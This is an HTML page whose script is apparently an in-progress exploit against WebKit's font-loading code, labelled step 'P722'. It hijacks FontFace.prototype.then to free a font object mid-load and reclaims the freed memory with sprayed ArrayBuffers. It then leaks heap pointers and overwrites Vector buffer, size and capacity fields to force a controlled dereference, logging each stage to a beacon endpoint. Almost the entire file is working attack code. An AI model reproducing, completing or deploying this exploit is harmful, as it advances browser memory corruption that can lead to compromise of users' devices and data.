<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P722 — Vector Buffer Poisoning & Controlled Dereference Scout</title>
<script>
'use strict';
/* ============================================================
 * P722 — Vector Buffer Poisoning & Controlled Dereference Scout
 *
 * Reverse Engineering Breakthrough from P717-P721:
 * - q11 and q12 are the fields of a WTF::Vector:
 *     q11 = m_buffer   (pointer to elements on heap)
 *     q12 = m_capacity << 32 | m_size
 * - WebKit sets m_capacity = 0x20 (32) and m_size = 0:
 *     q12 = 0x0000002000000000
 *
 * Objectives of P722:
 * 1. Reclaim baseK = 68 with deterministic 80 buffers.
 * 2. Vector Poisoning:
 *    Set m_size = 1 and m_capacity = 1:
 *      VIEW_B[12] = 0x0000000100000001n;
 * 3. Point m_buffer directly to our controlled buffer:
 *      VIEW_B[11] = P58;
 * 4. At P58, forge an element with controlled pointers:
 *      VIEW_B[0] = 0x1n (RefCount);
 *      VIEW_B[1] = P68 (target address to read/disclose);
 * 5. Trigger font lifecycle (face.load() / fonts.check() / fonts.load()).
 * 6. Monitor VIEW_B across all 24 qwords for secondary writes and pointer disclosure!
 * ============================================================ */

function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }

function b(tag,data){ try{var x=new XMLHttpRequest();
  x.open('GET','/beacon.php?tag=P722-'+encodeURIComponent(tag)+
    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
  x.send(null);}catch(e){} }

function log(s){
  var el = document.getElementById('out');
  if(el) el.textContent += s + '\n';
}

var P58 = null, P68 = null;
var FACE_B = null, BUF_B = null, VIEW_B = null;

function snap(){
  if(!VIEW_B) return [];
  var arr = [];
  for(var q=0; q<24; q++) arr.push(VIEW_B[q]);
  return arr;
}

function diffSnap(pre){
  if(!VIEW_B || !pre.length) return 'none';
  var ch = [];
  for(var q=0; q<24; q++){
    if(VIEW_B[q] !== pre[q]){
      ch.push('q' + q + '=0x' + h16(VIEW_B[q]));
    }
  }
  return ch.length ? ch.join(',') : 'none';
}

function run(){
  b('BOOT','p722-vector-scout');
  log('=== P722 Vector Buffer Poisoning Scout ===\n');

  /* Step 1: Baseline Leak */
  log('[Step 1] Baseline heap leak...');
  doLeak(function(){
    log('P58 = 0x' + h16(P58));
    log('P68 = 0x' + h16(P68) + '\n');

    /* Step 2: Reclaim baseK = 68 */
    log('[Step 2] Deterministic 80-slab reclaim...');
    doReclaim(function(){
      /* Step 3: Poison Vector m_buffer and m_size */
      log('\n[Step 3] Poisoning Vector (m_size=1, m_buffer=P58)...');
      poisonVector();

      /* Step 4: Trigger Font Lifecycle & Observe */
      log('\n[Step 4] Triggering Font lifecycle & inspecting writes...');
      testVectorDereference(function(){
        b('DONE','p722-complete');
        log('\n=== P722 Complete! ===');
      });
    });
  });
}

/* ---- Step 1: Baseline Leak ---- */
function doLeak(cb){
  b('LEAK-GO','');
  var st = document.createElement('style');
  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
  document.head.appendChild(st);

  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
  document.fonts.add(face);
  void face.loaded;

  var abs = [], fired = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired) return undefined; fired=true;
      if(st){st.remove(); st.textContent=''; st=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk0');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl0, lk0','AB');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs.length;i++){
      var u=new Uint8Array(abs[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }

    if(best<0 || bestNz<4){
      b('LEAK-MISS','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    var v = new BigUint64Array(abs[best]);
    extractPointers(v);

    if(!P58){
      b('LEAK-NOPTR','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
    setTimeout(cb, 100);
  }, 350);
}

function doLeakRetry(cb){
  b('LEAK-RETRY','');
  var st2 = document.createElement('style');
  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
  document.head.appendChild(st2);

  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
  document.fonts.add(face2);
  void face2.loaded;

  var abs2 = [], fired2 = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired2) return undefined; fired2=true;
      if(st2){st2.remove(); st2.textContent=''; st2=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk1');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl1, lk1','CD');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs2.length;i++){
      var u=new Uint8Array(abs2[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }
    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
    var v = new BigUint64Array(abs2[best]);
    extractPointers(v);
    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
    setTimeout(cb, 100);
  }, 400);
}

function extractPointers(v){
  var LOW = BigInt('0x1000000000');
  var HIGH = BigInt('0x80000000000');
  for(var q=0;q<24;q++){
    var val = v[q];
    if(val >= LOW && val < HIGH){
      if(!P58) P58 = val;
      else if(!P68 && val !== P58) P68 = val;
    }
  }
  if(!P68) P68 = 0n;
}

/* ---- Step 2: Deterministic Reclaim ---- */
function doReclaim(cb){
  b('RECLAIM-GO', 'fill_q12_q6=0x' + h16(P58));

  var stV = document.createElement('style');
  stV.textContent = '@font-face{font-family:vecFam;src:local(Arial);unicode-range:U+0047;}';
  document.head.appendChild(stV);

  FACE_B = new FontFace('vecFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
  document.fonts.add(FACE_B);
  void FACE_B.loaded;

  var absW = [], firedW = false;

  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if(firedW) return undefined; firedW = true;
      if(stV){ stV.remove(); stV.textContent = ''; }
      try{ document.fonts.delete(this); }catch(e){}
      document.body.offsetHeight;

      for(var k=0; k<80; k++){
        var ab = new ArrayBuffer(192);
        var view = new BigUint64Array(ab);
        view[12] = P58;
        view[6]  = P58;
        absW.push(ab);
      }
      try{ document.fonts.check('1em vecFam'); }catch(e){}
      return undefined;
    }, set: function(){}
  });

  document.fonts.load('1em vecFace, vecFam', 'GH');

  setTimeout(function(){
    delete FontFace.prototype.then;

    var best = -1, bestNz = 0;
    for(var i=0; i<absW.length; i++){
      var u = new Uint8Array(absW[i]), nz = 0;
      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
      if(nz > bestNz){ bestNz = nz; best = i; }
    }

    if(best < 0 || bestNz < 4){
      b('RECLAIM-MISS', 'nz=' + bestNz);
      log('Reclaim missed!');
      return;
    }

    BUF_B = absW[best];
    VIEW_B = new BigUint64Array(BUF_B);

    var dumpStr = 'baseK=' + best + '|nz=' + bestNz +
                  '|q0=0x' + h16(VIEW_B[0]) + '|q11=0x' + h16(VIEW_B[11]) +
                  '|q12=0x' + h16(VIEW_B[12]) + '|q13=0x' + h16(VIEW_B[13]);
    b('RECLAIM-OK', dumpStr);
    log('Deterministic Reclaim OK: ' + dumpStr);

    setTimeout(cb, 100);
  }, 400);
}

/* ---- Step 3: Poison Vector ---- */
function poisonVector(){
  if(!VIEW_B) return;

  var origQ11 = VIEW_B[11];
  var origQ12 = VIEW_B[12];

  /* Set m_size = 1, m_capacity = 1 */
  VIEW_B[12] = 0x0000000100000001n;

  /* Point m_buffer directly to our controlled buffer P58 */
  VIEW_B[11] = P58;

  /* In our controlled buffer, forge a valid source pointer structure */
  VIEW_B[1] = P68; /* Target disclosure pointer */

  b('VECTOR-POISON-OK', 'origQ11=0x' + h16(origQ11) + '|origQ12=0x' + h16(origQ12) +
                        '|newQ11=0x' + h16(P58) + '|newQ12=0x0000000100000001');
  log('Vector Poisoned: m_buffer -> P58, m_size = 1');
}

/* ---- Step 4: Test Vector Dereference ---- */
function testVectorDereference(cb){
  if(!VIEW_B || !FACE_B){ cb(); return; }

  /* 4A: Check face.status */
  var statusBefore = 'unknown';
  try { statusBefore = FACE_B.status; } catch(e){ statusBefore = e.message; }

  /* 4B: Probe face.load() */
  var pre = snap();
  var loadRes = 'none';
  try {
    var p = FACE_B.load();
    loadRes = typeof p;
  } catch(e){
    loadRes = 'ERR:' + (e.message||'').slice(0,60);
  }
  var dLoad = diffSnap(pre);
  b('VEC-LOAD', 'res=' + loadRes + '|writes=' + dLoad);
  log('FACE_B.load(): ' + loadRes + ' (writes=' + dLoad + ')');

  /* 4C: Probe fonts.check */
  pre = snap();
  var chkRes = false;
  try {
    chkRes = document.fonts.check('1em vecFace');
  } catch(e){
    chkRes = 'ERR:' + (e.message||'').slice(0,60);
  }
  var dChk = diffSnap(pre);
  b('VEC-CHECK', 'chk=' + chkRes + '|writes=' + dChk);
  log('fonts.check(): ' + chkRes + ' (writes=' + dChk + ')');

  /* 4D: Dump final state */
  var finalNonZero = [];
  for(var q=0; q<24; q++){
    if(VIEW_B[q] !== 0n){
      finalNonZero.push('q' + q + '=0x' + h16(VIEW_B[q]));
    }
  }
  b('VEC-FINAL-STATE', finalNonZero.join(';').slice(0, 700));
  log('Final State: ' + finalNonZero.join(', '));

  setTimeout(cb, 100);
}

if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
else document.addEventListener('DOMContentLoaded',run);
</script>
</head><body><pre id="out">P722 — Initializing Vector Buffer Poisoning Scout...</pre></body></html>
